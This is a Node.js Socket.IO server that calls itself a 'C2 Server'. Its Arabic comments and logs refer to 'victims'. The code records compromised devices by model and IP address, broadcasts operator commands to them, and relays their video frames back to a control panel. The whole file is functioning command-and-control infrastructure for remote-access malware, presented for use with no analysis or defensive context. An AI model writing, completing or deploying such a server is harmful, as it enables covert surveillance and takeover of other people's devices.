const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8 
});

app.get('/', (req, res) => {
    res.status(200).send('C2 Server is Online and Secure 😈');
});

let victims = {};

io.on('connection', (socket) => {
    console.log('[!] اتصال جديد');

    // إرسال قائمة الضحايا فور اتصال لوحة التحكم
    socket.on('get_victims', () => {
        Object.values(victims).forEach(v => socket.emit('new_victim_alert', v));
    });

    socket.on('victim_online', (data) => {
        victims[socket.id] = { id: socket.id, model: data.model, ip: socket.handshake.address };
        console.log(`[+] ضحية جديدة: ${data.model}`);
        io.emit('new_victim_alert', victims[socket.id]);
    });

    socket.on('admin_command', (payload) => {
        socket.broadcast.emit(payload.command, payload);
    });

    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    socket.on('disconnect', () => {
        delete victims[socket.id];
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => { console.log(`Server Live on ${PORT}`); });
